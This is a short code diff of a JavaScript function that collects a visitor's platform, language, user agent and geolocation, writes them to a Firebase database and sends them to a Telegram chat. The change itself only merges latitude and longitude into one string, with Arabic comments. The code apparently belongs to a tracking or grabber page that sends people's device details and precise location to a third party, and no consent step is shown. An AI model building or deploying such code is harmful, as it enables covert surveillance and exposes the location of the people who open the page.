@@ -48,7 +48,8 @@ async function sendDeviceInfo() {
 
   const sendInfo = (locationInfo = null) => {
     if (locationInfo) {
-      info.location = locationInfo;
+      // دمج الموقع في نص واحد
+      info.loc = `${locationInfo.lat}, ${locationInfo.lon}`;  // دمج latitude و longitude في نص واحد
     }
     const infoRef = dbRef(database, 'deviceInfo/' + Date.now());
     set(infoRef, info);
@@ -58,8 +59,8 @@ async function sendDeviceInfo() {
     text += `🌐 Platform: ${info.platform}\n`;
     text += `🧭 Language: ${info.language}\n`;
     text += `📟 UserAgent: ${info.userAgent}\n`;
-    if (info.location) {
-      text += `📍 Location: ${info.location.lat}, ${info.location.lon}\n`;
+    if (info.loc) {
+      text += `📍 Location: ${info.loc}\n`;  // دمج الموقع هنا كنص واحد
     }
     sendTelegramText(text);
   };
